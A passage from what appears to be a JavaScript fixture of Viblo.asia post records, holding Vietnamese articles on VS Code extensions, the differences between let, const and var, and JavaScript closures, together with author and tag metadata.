th\u1ebb m\u1edbi m\u00e0 ko c\u1ea7n ph\u1ea3i copy cut hay paste.\n\n**4.[Markdown Preview Enhanced](https://marketplace.visualstudio.com/items?itemName=shd101wyy.markdown-preview-enhanced)**\n\n![](https://images.viblo.asia/815f58f2-394c-4130-bb86-6172ea00b042.png)\nTi\u1ec7n \u00edch n\u00e0y gi\u00fap ch\u00fang ta vi\u1ebft Markdown inline v\u1eeba vi\u1ebft v\u1eeba preivew \u0111\u01b0\u1ee3c lu\u00f4n r\u1ea5t thu\u1eadn ti\u1ec7n\n\n**5.[Random Everything](https://marketplace.visualstudio.com/items?itemName=helixquar.randomeverything)**\n\n![](https://images.viblo.asia/9e8f8821-807a-4050-917e-35a458b1a5b9.gif)\n V\u1edbi ti\u1ec7n \u00edch n\u00e0y ch\u00fang ta c\u00f3 th\u1ec3 nhanh ch\u00f3ng t\u1ea1o d\u1eef li\u1ec7u m\u1eabu nhanh ch\u00f3ng v\u1edbi c\u00e1ch tu\u1ef3 ch\u1ec9nh l\u1ea5y d\u1eef li\u1ec7u ng\u1eabu nhi\u00ean\n \n **6.[CSS Peek](https://marketplace.visualstudio.com/items?itemName=pranaygp.vscode-css-peek)**\n \n![](https://images.viblo.asia/14b1d516-4c03-4876-bd20-0c477ed99005.gif)\nSau khi vi\u1ebft style cho ID hay Class n\u00e0o \u0111\u00f3 th\u00ec trong HTML khi tr\u1ecf v\u00e0o ID vs Class \u0111\u00f3 ch\u00fang ta c\u00f3 th\u1ec3 xem \u0111\u01b0\u1ee3c ngay style c\u1ee7a style \u0111\u00f3 \u1edf c\u1eeda s\u1ed5 popup hi\u1ec7n l\u00ean.\n\n**7.[Snippet Creator](https://marketplace.visualstudio.com/items?itemName=ryanolsonx.snippet-creator)**\n\n![](https://images.viblo.asia/b0e0f0ff-a90b-4102-897b-fb127e79cea7.gif)\nT\u1ef1 t\u1ea1o snippet cho ch\u00ednh code c\u1ee7a m\u00ecnh v\u1edbi b\u1ea5t k\u1ef3 ng\u00f4n ng\u1eef n\u00e0o\n\n\n### L\u1eddi k\u1ebft\n \u0110\u00e2y l\u00e0 nh\u1eefng extention m\u00ecnh c\u0169ng \u0111ang d\u00f9ng r\u1ea5t thu\u1eadn ti\u1ec7n khi l\u00e0m vi\u1ec7c, thu\u1eadn ti\u1ec7n v\u00e0 ti\u1ebft ki\u1ec7m \u0111\u01b0\u1ee3c nhi\u1ec1u th\u1eddi gian. Mong s\u1ebd l\u00e0 th\u00f4ng tin tham kh\u1ea3o h\u1eefu \u00edch cho nh\u1eefng ai c\u00f2n ch\u01b0a bi\u1ebft \u0111\u1ebfn nh\u1eefng ti\u1ec7n \u00edch n\u00e0y nh\u00e9. C\u1ea3m \u01a1n c\u00e1c b\u1ea1n \u0111\u00e3 \u0111\u1ecdc b\u00e0i.\n\nTham kh\u1ea3o : https://coliss.com/",
      published_at: "2021-03-17 15:10:07",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-20 08:00:11",
      translation_source: null,
      trend_at: null,
      promoted_at: null,
      reading_time: 3,
      points: 4,
      views_count: 147,
      clips_count: 3,
      comments_count: 0,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url:
        "https://images.viblo.asia/4251873b-29eb-4222-be57-652a171d386a.jpeg",
      user: {
        data: {
          id: 23879,
          url: "https://viblo.asia/u/tran-hanh",
          avatar: "405e514d-67fb-4978-8de1-f53333953521.jpg",
          name: "Tran Cong Hanh",
          username: "tran-hanh",
          followers_count: 10,
          reputation: 518,
          posts_count: 29,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "reactjs",
            name: "ReactJS",
            primary: false,
            image:
              "https://placehold.jp/16/2980b9/ffffff/80x80.jpg?text=ReactJS&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "css",
            name: "CSS",
            primary: false,
            image:
              "https://placehold.jp/16/16a085/ffffff/80x80.jpg?text=CSS&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "javascript",
            name: "JavaScript",
            primary: false,
            image:
              "https://placehold.jp/16/d35400/ffffff/80x80.jpg?text=JavaScript&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "visual-code",
            name: "visual code",
            primary: false,
            image:
              "https://placehold.jp/16/f39c12/ffffff/80x80.jpg?text=visual+code&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [],
      },
    },
    {
      id: 51203,
      title: "Javascript - Ph\u00e2n bi\u1ec7t let, const v\u00e0 var",
      slug: "Qbq5Qa3R5D8",
      url:
        "https://viblo.asia/p/javascript-phan-biet-let-const-va-var-Qbq5Qa3R5D8",
      user_id: 55346,
      moderation: null,
      transliterated: "javascript-phan-biet-let-const-va-var",
      contents_short:
        "Gi\u1edbi thi\u1ec7u\nJavascript 2015 (ES6) ra m\u1eaft k\u00e8m theo r\u1ea5t nhi\u1ec1u t\u00ednh n\u0103ng gi\u00fap ch\u00fang ta vi\u1ebft code m\u1ed9t c\u00e1ch g\u1ecdn g\u00e0ng, s\u1ea1ch \u0111\u1eb9p h\u01a1n, d\u1ec5 d\u00e0ng \u0111\u1ecdc h\u01a1n. M\u1ed9t s\u1ed1 ch\u1ee9c n\u0103ng ti\u00eau bi\u1ec3u nh\u01b0: let, const, arrow func...",
      contents:
        "# Gi\u1edbi thi\u1ec7u\nJavascript 2015 (ES6) ra m\u1eaft k\u00e8m theo r\u1ea5t nhi\u1ec1u t\u00ednh n\u0103ng gi\u00fap ch\u00fang ta vi\u1ebft code m\u1ed9t c\u00e1ch g\u1ecdn g\u00e0ng, s\u1ea1ch \u0111\u1eb9p h\u01a1n, d\u1ec5 d\u00e0ng \u0111\u1ecdc h\u01a1n. M\u1ed9t s\u1ed1 ch\u1ee9c n\u0103ng ti\u00eau bi\u1ec3u nh\u01b0: `let`, `const`, `arrow function`, `promises`, ... Trong b\u00e0i vi\u1ebft n\u00e0y ch\u00fang ta s\u1ebd t\u00ecm hi\u1ec3u v\u1ec1 `let` v\u00e0 `const` ph\u1ee5c v\u1ee5 trong vi\u1ec7c khai b\u00e1o d\u1eef li\u1ec7u trong JS. S\u1ef1 kh\u00e1c bi\u1ec7t c\u1ee7a `let`, `const` v\u00e0 `var`.\n\n# S\u1ef1 kh\u00e1c bi\u1ec7t\n\n### Hoisting\nTr\u01b0\u1edbc ti\u00ean ta s\u1ebd t\u00ecm hi\u1ec3u xem `hoisting` l\u00e0 g\u00ec tr\u01b0\u1edbc khi ph\u00e2n bi\u1ec7t `let`, `const` v\u00e0 `var`. Gi\u1ea3i th\u00edch m\u1ed9t c\u00e1ch d\u1ec5 hi\u1ec3u th\u00ec `hoisting` l\u00e0 vi\u1ec7c di chuy\u1ec3n c\u00e1c khai b\u00e1o l\u00ean \u0111\u1ea7u \u0111\u1ec3 th\u1ee5c thi code c\u1ee7a JS. V\u1eady `let`, `const`, `var` c\u00f3 hoisting kh\u00e1c nhau nh\u01b0 th\u1ebf n\u00e0o?. Ta x\u00e9t v\u00ed d\u1ee5 sau:\n\n```\n// index.js\n\nconsole.log(foo);\nconsole.log(bar);\nconsole.log(mickey);\n\nvar foo = 'Hi';\nlet bar = 'Hello';\nconst mickey = 'kimsohyun';\n```\n\nTrong file `index.js` ta ti\u1ebfn h\u00e0nh log ra gi\u00e1 tr\u1ecb c\u1ee7a bi\u1ebfn `foo, bar, mickey` tr\u01b0\u1edbc khi ch\u00fang \u0111\u01b0\u1ee3c khai b\u00e1o. Khi ta ch\u1ea1y file `index.js` th\u00ec ta s\u1ebd c\u00f3 k\u1ebft qu\u1ea3 nh\u01b0 sau.\n\n![](https://images.viblo.asia/d745ece9-bfaf-4441-a031-187a26a8c877.png)\n\nTrong l\u1ea7n ch\u1ea1y \u0111\u1ea7u ti\u00ean sau khi `compiled` ta th\u1ea5y `terminal` in ra `undefined` v\u00e0 m\u1ed9t l\u1ed7i `ReferenceError: bar is not defined`. Sau \u0111\u00f3 m\u00ecnh c\u00f3 x\u00f3a d\u00f2ng `console.log(bar)` \u0111\u1ebb ti\u1ebfn h\u00e0nh ch\u1ea1y l\u1ea1i th\u00ec th\u1ea5y `terminal` ti\u1ebfp t\u1ee5c in ra `undefined` v\u00e0 l\u00f5i `ReferenceError: mickey is not defined`. Qua v\u00ed d\u1ee5 ta d\u1ec5 d\u00e0ng nh\u00e2n th\u1ea5y `var` c\u00f3 `hoisting`, `let`, `const` kh\u00f4ng c\u00f3 `hoisting`, nh\u01b0ng s\u1ef1 th\u1eadt kh\u00f4ng ph\u1ea3i nh\u01b0 v\u1eady. **T\u1ea5t c\u1ea3 c\u00e1c khai b\u00e1o(function, let, const, var) trong Javascript \u0111\u1ec1u \u0111\u01b0\u1ee3c hoisted**. S\u1ef1 kh\u00e1c bi\u1ec7t \u1edf \u0111\u00e2y l\u00e0 `var` khi `hoisting` th\u00ec \u0111\u01b0\u1ee3c kh\u1edfi t\u1ea1o l\u00e0 gi\u00e1 tr\u1ecb `undefined` c\u00f2n `const` v\u00e0 `let` th\u00ec kh\u00f4ng.\n\nTa c\u00f3 sau khi `hoisting` th\u00ec `var` s\u1ebd ki\u1ec3u nh\u01b0 sau.\n```\nvar foo;\n\nconsole.log(foo);\n\nfoo = 'Hi';\n```\n\n### Scope\n`Scope` hi\u1ec3u m\u1ed9t c\u00e1ch \u0111\u01a1n gi\u1ea3n l\u00e0 ph\u1ea1m vi s\u1eed d\u1ee5ng c\u1ee7a m\u1ed9t bi\u1ebfn. Ta x\u00e9t v\u00ed d\u1ee5 sau:\n```\nif (true) {\n    var foo = \"foo!\";\n}\n\nconsole.log(foo);\n\n(function() {\n    var bar = \"bar!\";\n})();\n\nconsole.log(bar);\n```\n\nOutput s\u1ebd nh\u01b0 sau:\n![](https://images.viblo.asia/22a08c06-3357-466c-8d26-592e812dee7e.png)\n\nTa c\u00f3 th\u1ec3 th\u1ea5y khi `compiled` th\u00ec bi\u1ebfn `foo` \u0111\u01b0\u1ee3c khai b\u00e1o trong `if` c\u00f2n bi\u1ebfn `bar` \u0111\u01b0\u1ee3c khai b\u00e1o trong m\u1ed9t h\u00e0m. Ta c\u00f3 k\u1ebft qu\u1ea3 in ra \u0111\u01b0\u1ee3c bi\u1ebfn `foo` nh\u01b0ng \u0111\u1ebfn `bar` l\u1ea1i b\u00e1o m\u1ed9t l\u1ed7i `ReferenceError`. Nh\u01b0 v\u1eady bi\u1ebfn `var` khi kh\u00e1i b\u00e1o trong m\u1ec7nh \u0111\u1ec1 `if` (block scope) s\u1ebd c\u00f3 scope l\u00e0 `global` n\u00ean ta c\u00f3 th\u1ec3 truy c\u1eadp v\u00e0o bi\u1ebfn \u0111\u00f3 \u1edf ngo\u00e0i c\u1ee7a m\u1ec7nh \u0111\u1ec1 `if`, c\u00f2n khi s\u1eed d\u1ee5ng trong h\u00e0m(function) th\u00ec s\u1ebd c\u00f3 scope l\u00e0 `function sopce/local scope` n\u00ean khi truy c\u1eadp v\u00e0o bi\u1ebfn \u0111\u00f3 \u1edf ngo\u00e0i s\u1ebd l\u1ed7i ta ch\u1ec9 c\u00f3 th\u1ec3 truy c\u1eadp v\u00e0o bi\u1ebfn \u0111\u00f3 \u1edf trong `scope` \u0111\u00f3. Bi\u1ebfn `let`, `const` khi l\u00e0m t\u01b0\u01a1ng t\u1ef1 nh\u01b0 v\u00ed d\u1ee5 kia ta c\u00f3 k\u1ebft qu\u1ea3 c\u1ea3 hai tr\u01b0\u1eddng h\u1ee3p \u0111\u1ec1u c\u00f3 l\u1ed7i. Nh\u01b0 v\u1eady ta ti\u1ebfp t\u1ee5c c\u00f3 k\u1ebft lu\u1eadn bi\u1ebfn `let`, `const` s\u1ebd l\u00e0 `block scope` khi ta ti\u1ebfn h\u00e0nh acess v\u00e0o bi\u1ebfn \u1edf ngo\u00e0i scope th\u00ec s\u1ebd kh\u00f4ng s\u1eed d\u1ee5ng \u0111\u01b0\u1ee3c.\n```\nif (true) {\n    let foo = \"foo!\";\n    if (true) {\n        let foo = \"foo! scoped\";\n        console.log(foo);\n    }\n}\n```\nOutput: \n```\nfoo! scoped\n```\nKhi bi\u1ebfn \u0111\u01b0\u1ee3c khai b\u00e1o kh\u00e1c `scope` nhau ta ho\u00e0n to\u00e0n c\u00f3 th\u1ec3 \u0111\u1ec3 tr\u00f9ng t\u00ean khi s\u1eed d\u1ee5ng s\u1ebd \u01b0u ti\u00ean bi\u1ebfn \u1edf `scope` g\u1ea7n nh\u1ea5t. V\u00ed d\u1ee5 tr\u00ean ta c\u00f3 th\u1ec3 l\u00e0m t\u01b0\u01a1ng t\u1ef1 v\u1edbi `const`.\n\n### Assignment\nTa x\u00e9t v\u00ed d\u1ee5\n```\nvar foo = 'Hi';\nlet bar = 'Hello';\nconst mickey = 'kimsohyun';\n\nvar foo = 'Hi 2';\nlet bar = 'Hello 2';\nconst mickey = 'kimsohyun 2';\n```\nOutput:\n![](https://images.viblo.asia/b65ec0fc-5cee-46f6-bf90-e6f582d57596.png)\n\nQua v\u00ed d\u1ee5 tr\u00ean ta th\u1ea5y `var` c\u00f3 th\u1ec3 ti\u1ebfn h\u00e0nh khai b\u00e1o l\u1ea1i bi\u1ebfn nh\u01b0ng c\u00f2n `let` v\u00e0 `const` th\u00ec ta kh\u00f4ng th\u1ec3 ti\u1ebfn h\u00e0nh khai b\u00e1o l\u1ea1i.\n\nX\u00e9t ti\u1ebfp v\u00ed d\u1ee5:\n```\nvar foo;\nlet bar;\nconsole.log(foo, bar);\n```\nOutput:\n```\nundefined undefined\n```\nTa th\u1ea5y \u0111\u1ed1i v\u1edbi `var`, `let` ta c\u00f3 th\u1ec3 ti\u1ebfn h\u00e0nh khai b\u00e1o m\u00e0 ch\u01b0a g\u00e1n gi\u00e1 tr\u1ecb. Nh\u01b0ng n\u1ebfu ta khai b\u00e1o bi\u1ebfn `const` m\u00e0 kh\u00f4ng g\u00e1n gi\u00e1 tr\u1ecb cho n\u00f3 th\u00ec sao? Sau khi th\u1eed ta c\u00f3 k\u1ebft qu\u1ea3 n\u00f3 s\u1ebd b\u00e1o m\u1ed9t l\u1ed7i `SyntaxError: Missing initializer in const declaration` => Khi khai b\u00e1o v\u1edbi `const` ta ph\u1ea3i g\u00e1n gi\u00e1 tr\u1ecb cho n\u00f3.\n\nTh\u00eam n\u1eefa khi x\u00e9t bi\u1ebfn `const` ta c\u00f3 th\u1ec3 hi\u1ec3u n\u00f3 l\u00e0 h\u1eb1ng s\u1ed1. N\u00ean khi ta c\u1ed1 t\u00ecnh thay \u0111\u1ed5i bi\u00e9n \u0111\u01b0\u1ee3c khai b\u00e1o v\u1edbi t\u1eeb kh\u00f3a `const` th\u00ec ta s\u1ebd g\u1eb7p m\u1ed9t l\u1ed7i `TypeError: Assigment to constant varibale`. Ta kh\u00f4ng th\u1ec3 s\u1eed d\u1ee5ng to\u00e1n t\u1eed g\u00e1n (`=`) t\u1edbi l\u1ea7n th\u1ee9 2 v\u1edbi bi\u1ebfn `const` c\u00f2n \u0111\u1ed1i v\u1edbi `let` v\u00e0 `var` ta c\u00f3 th\u1ec3 s\u1eed d\u1ee5ng tho\u1ea3i m\u00e1i. C\u00e1c b\u1ea1n c\u00f3 th\u1ec3 ki\u1ec3m tra v\u1edbi v\u00ed d\u1ee5 b\u00ean d\u01b0\u1edbi b\u1eb1ng c\u00e1ch thay `const` -> `var` ho\u1eb7c `let`\n```\nconst foo = 123;\n\nfoo = 321;\n\nconsole.log(foo);\n```\n\nC\u00f2n m\u1ed9t tr\u01b0\u1eddng h\u1ee3p m\u1ecdi ng\u01b0\u1eddi hay m\u1eafc sai l\u00e0m v\u1ec1 `const` nh\u01b0 sau:\n```\nconst obj = {\n    name: 'foo'\n};\n\nobj.name = 'bar';\nconsole.log(obj.name);\n```\n\nKhi ch\u1ea1y code ta c\u00f3 th\u1ec3 th\u1ea5y log ra ch\u1eef bar nh\u01b0ng nhi\u1ec1u ng\u01b0\u1eddi hay nh\u1ea7m l\u1eabn l\u00e0 l\u1ed7i v\u00ec g\u00e1n l\u1ea7n th\u1ee9 2 cho bi\u1ebfn `const`. Ta kh\u00f4ng th\u1ec3 s\u1eed d\u1ee5ng to\u00e1n t\u1eed g\u00e1n th\u1ee9 2 v\u1edbi bi\u1ebfn l\u00e0 `const` \u1edf \u0111\u00e2y ta ch\u1ec9 g\u00e1n l\u1ea1i m\u1ed9t thu\u1ed9c t\u00ednh c\u1ee7a `obj` ch\u1ee9 ta kh\u00f4ng g\u00e1n l\u1ea1i `obj`.\n\n# T\u1ed5ng k\u1ebft\nSau khi x\u00e9t qua c\u00e1c v\u00ed d\u1ee5 ta s\u1ebd t\u1ed5ng k\u1ebft l\u1ea1i s\u1ef1 kh\u00e1c bi\u1ec7t c\u1ee7a ba bi\u1ebfn `let, const, var` m\u1ed9t ch\u00fat nh\u01b0 sau:\n\n![](https://images.viblo.asia/cb582798-fddf-4af3-ae7e-ded31585327e.png)\n\n\u0110\u1ec3 hi\u1ec3u k\u1ef9 h\u01a1n v\u1ec1 n\u00f3 c\u00e1c b\u1ea1n n\u00ean nghi\u00ean c\u1ee9u k\u1ef9 c\u00e1c v\u00ed d\u1ee5 m\u00e0 m\u00ecnh \u0111\u01b0a ra gi\u00fap hi\u1ec3u h\u01a1n v\u1ec1 `let, const, var`. \u0110\u00e2y l\u00e0 b\u00e0i vi\u1ebft \u0111\u1ea7u ti\u1ec1n trong series c\u00f9ng t\u00ecm hi\u1ec3u v\u1ec1 ECMAScript - ES6 c\u1ee7a m\u00ecnh mong c\u00e1c b\u1ea1n \u1ee7ng h\u1ed9.\n\n# Tham kh\u1ea3o\n\nhttps://www.valentinog.com/blog/var/",
      published_at: "2021-03-15 01:44:54",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-20 08:00:11",
      translation_source: null,
      trend_at: null,
      promoted_at: null,
      reading_time: 5,
      points: 0,
      views_count: 88,
      clips_count: 0,
      comments_count: 1,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url:
        "https://images.viblo.asia/d745ece9-bfaf-4441-a031-187a26a8c877.png",
      user: {
        data: {
          id: 55346,
          url: "https://viblo.asia/u/dangcq17",
          avatar: "13acf95f-1c4a-4e05-8993-6184c5904e68.png",
          name: "Cao Qu\u00fd \u0110\u0103ng",
          username: "dangcq17",
          followers_count: 1,
          reputation: 37,
          posts_count: 4,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "javascript",
            name: "JavaScript",
            primary: false,
            image:
              "https://placehold.jp/16/d35400/ffffff/80x80.jpg?text=JavaScript&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "es6",
            name: "es6",
            primary: false,
            image:
              "https://placehold.jp/16/2980b9/ffffff/80x80.jpg?text=es6&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "happy-new-year",
            name: "Happy New Year",
            primary: false,
            image:
              "https://placehold.jp/16/8e44ad/ffffff/80x80.jpg?text=Happy+New+Year&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [
          {
            id: 43976,
            url: "https://viblo.asia/u/tuannd1",
            avatar: "c99821b4-3c27-4a5a-aa34-1b0bc9f06a60.jpg",
            name: "Tu\u1ea5n Nguy\u1ec5n",
            username: "tuannd1",
            followers_count: 0,
            reputation: 0,
            posts_count: 0,
            banned_at: null,
          },
        ],
      },
    },
    {
      id: 51299,
      title:
        "Closure trong Javascript - Ph\u1ea7n 2: \u0110\u1ecbnh ngh\u0129a v\u00e0 c\u00e1ch d\u00f9ng",
      slug: "gDVK2B6AKLj",
      url:
        "https://viblo.asia/p/closure-trong-javascript-phan-2-dinh-nghia-va-cach-dung-gDVK2B6AKLj",
      user_id: 34726,
      moderation: null,
      transliterated: "closure-trong-javascript-phan-2-dinh-nghia-va-cach-dung",
      contents_short:
        "C\u00e1c b\u1ea1n c\u00f3 th\u1ec3 \u0111\u1ecdc qua ph\u1ea7n 1 \u1edf \u0111\u00e2y\n\u0110\u1ec3 m\u1ecdi ng\u01b0\u1eddi kh\u00f4ng qu\u00ean, m\u00ecnh xin t\u00f3m t\u1eaft g\u1ecdn l\u1ea1i kh\u00e1i ni\u1ec7m lexical environment:\nLexical Environment l\u00e0 m\u1ed9t object gi\u1ea5u t\u00ean c\u00f3 trong m\u1ecdi object trong Javacript, ...",
      contents:
        '# C\u00e1c b\u1ea1n c\u00f3 th\u1ec3 \u0111\u1ecdc qua ph\u1ea7n 1 \u1edf [\u0111\u00e2y](https://viblo.asia/p/closure-trong-javascript-phan-1-lexical-environment-3P0lP1vv5ox) \n## \u0110\u1ec3 m\u1ecdi ng\u01b0\u1eddi kh\u00f4ng qu\u00ean, m\u00ecnh xin t\u00f3m t\u1eaft g\u1ecdn l\u1ea1i kh\u00e1i ni\u1ec7m lexical environment:\nLexical Environment l\u00e0 m\u1ed9t object gi\u1ea5u t\u00ean c\u00f3 trong m\u1ecdi object trong Javacript, n\u00f3 ch\u1ee9a c\u00e1c bi\u1ebfn trong 1 scope v\u00e0 c\u00e1c reference \u0111\u1ebfn m\u00f4i tr\u01b0\u1eddng b\u00ean ngo\u00e0i. \n\n## Oke ch\u1ee9 ? Gi\u1edd th\u00ec \u0111\u1ebfn \u0111\u1ecbnh ngh\u0129a v\u1ec1 Closure:\n***\nClosure l\u00e0 m\u1ed9t h\u00e0m m\u00e0 c\u00f3 th\u1ec3 nh\u1edb v\u00e0 truy c\u1eadp `lexical environment` c\u1ee7a n\u00f3 ngay c\u1ea3 khi \u1edf ngo\u00e0i `lexical environment` \u0111\u00f3. \n***\n\nCh\u00fang ta h\u00e3y c\u00f9ng xem v\u00ed d\u1ee5 sau:\n```js\nfunction say() {\n    let term = "I would like to say:";\n    \n    function stuff() {\n        console.log(`${term} Hello Hi Ha Ya`);\n    }\n    \n    return stuff;\n}\nlet s = say();\ns()\n> I would like to say: Hello Hi Ha Ya\n```\n\nC\u00f3 th\u1ec3 th\u1ea5y h\u00e0m `stuff` \u0111\u01b0\u1ee3c tr\u1ea3 v\u1ec1 b\u1edfi h\u00e0m `say`, v\u00e0 ch\u00fang ta g\u00e1n `s` th\u00e0nh ch\u00ednh h\u00e0m `stuff` (ch\u1ee9 kh\u00f4ng ph\u1ea3i gi\u00e1 tr\u1ecb tr\u1ea3 v\u1ec1 c\u1ee7a h\u00e0m `stuff`).\n\nV\u1eady, h\u00e0m `stuff` sau khi \u0111\u01b0\u1ee3c g\u00e1n v\u00e0o `s`, \u0111\u00e3 kh\u00f4ng c\u00f2n ch\u1ea1y trong `lexical environment` m\u00e0 n\u00f3 \u0111\u01b0\u1ee3c khai b\u00e1o k\u00e8m.  \n\nSau khi h\u00e0m `say` \u0111\u01b0\u1ee3c ch\u1ea1y, ch\u00fang ta s\u1ebd ngh\u0129 r\u1eb1ng c\u00e1c th\u00f4ng tin trong `lexical environment` c\u1ee7a n\u00f3 s\u1ebd bi\u1ebfn m\u1ea5t, nh\u01b0ng b\u1edfi v\u00ec h\u00e0m `stuff` v\u1eabn t\u1ed3n t\u1ea1i v\u00e0 c\u00f3 ch\u1ee9a m\u1ed9t k\u1ebft n\u1ed1i \u0111\u1ebfn `lexical environment` b\u00ean ngo\u00e0i (\u1edf \u0111\u00e2y l\u00e0 h\u00e0m `say`, c\u00e1c th\u00f4ng tin n\u00e0y v\u1eabn \u0111\u01b0\u1ee3c l\u01b0u gi\u1eef. C\u00f3 ng\u01b0\u1eddi g\u1ecdi ch\u00ednh s\u1ee3i d\u00e2y k\u1ebft n\u1ed1i n\u00e0y m\u1edbi l\u00e0 `closure`.\n\n## Closure trong Javascript th\u00f4ng d\u1ee5ng h\u01a1n b\u1ea1n ngh\u0129\nCh\u00fang ta s\u1ebd l\u1ea5y ti\u1ebfp 1 v\u00ed d\u1ee5 nh\u01b0 sau:\n```js\nfunction wait(message) {\n\n\tsetTimeout( function timer(){\n\t\tconsole.log( message );\n\t}, 1000 );\n\n}\n\nwait( "Hello, closure!" );\n> Hello, closure!\n```\n\u0110\u00e2y l\u00e0 m\u1ed9t v\u00ed d\u1ee5 l\u1ea5y tr\u1ef1c ti\u1ebfp t\u1eeb s\u00e1ch [You Dont Know Javascript](https://github.com/getify/You-Dont-Know-JS/blob/1st-ed/scope%20%26%20closures/ch5.md) .\nAi \u0111\u00e3 t\u1eebng \u0111\u1ed9ng \u0111\u1ebfn Javascript th\u00ec \u0111\u1ec1u \u0111\u00e3 d\u00f9ng \u0111\u1ebfn h\u00e0m `setTimeout`. \u1ede trong v\u00ed d\u1ee5 n\u00e0y, ch\u00fang ta c\u00f3 m\u1ed9t h\u00e0m trong c\u00f9ng l\u00e0 `timer` v\u00e0 s\u1ebd truy\u1ec1n n\u00f3 v\u00e0o trong `setTimeout` \u0111\u1ec3 ch\u1ea1y sau 1 gi\u00e2y. \u0110\u00e2y l\u00e0 m\u1ed9t c\u00e1ch d\u00f9ng m\u00e0 m\u00ecnh ngh\u0129 l\u00e0 kh\u00e1 ph\u1ed5 bi\u1ebfn. C\u0169ng gi\u1ed1ng nh\u01b0 v\u00ed d\u1ee5 tr\u01b0\u1edbc, c\u00f3 th\u1ec3 b\u1ea1n ngh\u0129 r\u1eb1ng sau 1s th\u00ec tham s\u1ed1 `message` c\u1ee7a h\u00e0m `wait` \u0111\u00fang ra \u0111\u00e3 ph\u1ea3i bi\u1ebfn m\u1ea5t, nh\u01b0ng h\u00e0m `timer` \u1edf \u0111\u00e2y v\u1eabn c\u00f3 m\u1ed9t s\u1ee3i d\u00e2y k\u1ebft n\u1ed1i \u0111\u1ebfn lexical environment c\u1ee7a `wait`, v\u00e0 ng\u0103n kh\u00f4ng cho `message` b\u1ecb b\u1ed9 d\u1ecdn r\u00e1c (Garbage Collector) x\u00f3a. \n## Closure v\u00e0 v\u00f2ng l\u1eb7p\nB\u1ea1n ngh\u0129 v\u00f2ng l\u1eb7p sau s\u1ebd in ra g\u00ec ?\n```js\nfor (var i=1; i<=5; i++) {\n\tsetTimeout( function timer(){\n\t\tconsole.log( i );\n\t}, i*1000 );\n}\n```\nK\u1ebft qu\u1ea3 th\u1ef1c l\u00e0 n\u00f3 s\u1ebd in ra s\u1ed1 `6` 5 l\u1ea7n, m\u1ed7i l\u1ea7n c\u00e1ch 1 gi\u00e2y. T\u1ee9c l\u00e0 `i` m\u00e0 `setTimeout` nh\u1eadn \u0111\u01b0\u1ee3c \u0111ang kh\u00e1c v\u1edbi `i` m\u00e0 `timer` nh\u1eadn \u0111\u01b0\u1ee3c, t\u1ea1i sao th\u1ebf ?\n\n\u0110\u1ea7u ti\u00ean, `6` \u0111\u1ebfn t\u1eeb \u0111\u00e2u ? N\u00f3 l\u00e0 k\u1ebft qu\u1ea3 khi v\u00f2ng l\u1eb7p g\u1eb7p \u0111i\u1ec1u ki\u1ec7n kh\u00f4ng th\u1ecfa m\u00e3n `i <= 5`, t\u1ee9c `i = 6`, khi \u0111\u00f3 n\u00f3 k\u1ebft th\u00fac v\u00e0 h\u00e0m `setTimeout` m\u1edbi b\u1eaft \u0111\u1ea7u \u0111\u01b0\u1ee3c ch\u1ea1y. V\u00e0 cho d\u00f9ng b\u1ea1n c\u00f3 thay `i*1000` b\u1eb1ng `0`, h\u00e0m `setTimeout` v\u1eabn s\u1ebd ch\u1ea1y sau v\u00f2ng l\u1eb7p ho\u00e0n th\u00e0nh. \nV\u1eady l\u00e0m th\u1ebf n\u00e0o \u0111\u1ec3 in \u0111\u00fang nh\u01b0 m\u00ecnh mu\u1ed1n ?\n\n\u0110i\u1ec1u ch\u00fang ta mu\u1ed1n \u1edf \u0111\u00e2y c\u00f3 l\u1ebd l\u00e0 m\u1ed7i v\u00f2ng l\u1eb7p b\u1eaft \u0111\u01b0\u1ee3c bi\u1ebfn `i` c\u1ee7a ri\u00eang n\u00f3, nh\u01b0ng hi\u1ec7n t\u1ea1i, c\u1ea3 5 l\u1ea7n l\u1eb7p c\u1ee7a v\u00f2ng l\u1eb7p n\u00e0y \u0111ang d\u00f9ng chung m\u1ed9t `lexical environment` b\u00ean ngo\u00e0i m\u00e0 ch\u1ec9 c\u00f3 m\u1ed9t `i` khi v\u00f2ng l\u1eb7p \u0111\u00e3 ch\u1ea1y xong. V\u1eady c\u00e1i ch\u00fang ta c\u1ea7n l\u00e0 m\u1ed9t `lexical environment` m\u00e0 c\u00f3 th\u1ec3 ch\u1ee9a bi\u1ebfn `i` n\u00e0y. \n\n```js\nfor (var i=1; i<=5; i++) {\n\t(function(){\n\t\tvar j = i;\n\t\tsetTimeout( function timer(){\n\t\t\tconsole.log( j );\n\t\t}, j*1000 );\n\t})();\n}\n```\nHo\u1eb7c\n\n```js\nfor (var i=1; i<=5; i++) {\n\t(function(j){\n\t\tsetTimeout( function timer(){\n\t\t\tconsole.log( j );\n\t\t}, j*1000 );\n\t})( i );\n}\n```\n\nC\u00fa ph\u00e1p n\u00e0y:\n```\n(function(){\n   ...\n})();\n```\nL\u00e0 m\u1ed9t [IIFE ](https://developer.mozilla.org/en-US/docs/Glossary/IIFE), vi\u1ec7c d\u00f9ng m\u1ed9t IIFE trong v\u00f2ng l\u1eb7p s\u1ebd t\u1ea1o ra m\u1ed9t `lexical environment` m\u1edbi b\u1ecdc quanh h\u00e0m `setTimeout` \u1edf m\u1ed7i v\u00f2ng, cung c\u1ea5p cho n\u00f3 bi\u1ebfn `i` m\u00e0 n\u00f3 c\u1ea7n. \n\n## Closure \u0111\u01b0\u1ee3c d\u00f9ng trong tr\u01b0\u1eddng h\u1ee3p n\u00e0o ?\n\nC\u00f3 